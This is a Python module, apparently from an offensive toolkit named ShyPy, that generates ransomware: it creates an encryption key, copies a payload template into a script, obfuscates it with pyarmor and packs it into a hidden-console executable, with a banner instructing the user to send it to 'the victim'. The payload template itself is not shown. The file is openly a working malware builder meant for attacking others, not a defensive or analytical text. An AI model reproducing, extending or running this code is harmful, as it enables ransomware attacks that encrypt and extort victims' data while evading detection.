from cryptography.fernet import Fernet
import platform
import os
import time

from shypy import Shypy

OS = platform.system().lower()

colors = {
    'BLACK': '\033[0;30m',
    'RED': '\033[0;31m',
    'GREEN': '\033[0;32m',
    'YELLOW': '\033[0;33m',
    'BLUE': '\033[0;34m',
    'MAGENTA': '\033[0;35m',
    'CYAN': '\033[0;36m',
    'WHITE': '\033[0;37m',
    'ZERO': '\033[0m'
}

class RansomWare_Generator():
    def generate_key(self):
        key = Fernet.generate_key()
        with open("Modules/Ransomware_Generator/Key_File/key.key", "wb") as key_file:
            key_file.write(key)

    def ransomware_generator(self, name):
        if platform.system() == "Windows":
            os.system("cls")
            file_name = "Modules\Ransomware_Generator\Payloads\DefaultPayload.txt"
        else:
            os.system("clear")
            file_name = "Modules/Ransomware_Generator/Payloads/DefaultPayload.txt"

        file_loc = os.path.abspath(os.path.join(os.getcwd(), file_name))
        with open(name, "w", encoding="utf-8") as file:
            with open(file_loc, "r", encoding="utf-8") as file2:
                file_content = file2.read()
                file.write(file_content)
    
    def obfuscate(self, name):
        try:
            os.system(f"pyarmor gen {name}")
        
        except Exception as e:
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} ERROR: {str(e)}")
                
    def convert_to_exe(self, name, icon=""):
        if icon == "":
            if OS == "windows":
                os.system(f"pyinstaller --onefile --noconsole --hidden-import=cryptography --hidden-import=os --clean dist/{name}")

            else:
                os.system(f"pyinstaller --onefile --noconsole --hidden-import=cryptography --hidden-import=os dist/{name}")
        else:
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} Name Invalid")
    
    def ended(self, name):
        if OS == "windows":
            os.remove(name)
            os.remove(f"dist\{name}")
        else:
            os.remove(name)
            os.remove(f"dist/{name}")

        exe_location = name.replace(".py", ".exe")
        exe_loc = os.path.abspath(exe_location)
        self.dist_folder = os.path.abspath(os.path.join(exe_loc, os.pardir))
        self.clear()
        if OS == "windows":
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} RansomWare Was Created On this Location: {self.dist_folder}/dist/{exe_location}")
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} Key Was Created On This location: {self.dist_folder}\Key_File") 
        else:
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} RansomWare Was Created On this Location: {self.dist_folder}/dist/{exe_location}")
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} Key Was Created On This location: {self.dist_folder}/Key_File") 
    
    def start(self):
        self.clear()
        print(f"""

            ╔══════════════════════════════════════════════════════════════════════╗
            ║*                     - Ransomware Generator -                       *║
            ╠══════════════════════════════════════════════════════════════════════╣
            ║RULES : In order for the program to be successful, it must be sent to ║
            ║the victim in the same file with the key, otherwise it will not work. ║
            ╠══════════════════════════════════╦═══════════════════════════════════╣ 
            ║            Commands              ║            Function               ║    
            ╠══════════════════════════════════╬═══════════════════════════════════╣   
            ║ "generate"                       : Generate a Backdoor.              ║
            ║ "back"                           : Back To Shypy.                    ║                              
            ╠══════════════════════════════════╩═══════════════════════════════════╣            
            ║*                            - The ShyPy -                           *║ 
            ╚══════════════════════════════════════════════════════════════════════╝
            \n\n""")
        
        answer = input(f"{colors['RED']}[ShyPy] =>{colors['ZERO']} ").lower()  
        
        if answer == "generate":
            user_rw_name = input(f"{colors['GREEN']}[+]{colors['ZERO']} The Name Of Ranswomware: ")
            user_rw_icon = input(f"{colors['GREEN']}[+]{colors['ZERO']} The Icon Of Ransomware (Optional): ")
            user_rw_name = user_rw_name + ".py"
            self.generate_key()
            self.ransomware_generator(user_rw_name)
            self.obfuscate(user_rw_name)
            self.convert_to_exe(user_rw_name, user_rw_icon)
            self.ended(user_rw_name)
            
        elif answer == "back":
            s = Shypy()
            s.program_menu()

        else:
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} Invalid Option")
            time.sleep(0.5)
            self.start()

    def clear(self):
        if OS == "windows":
            os.system("cls")

        else:
            os.system("clear")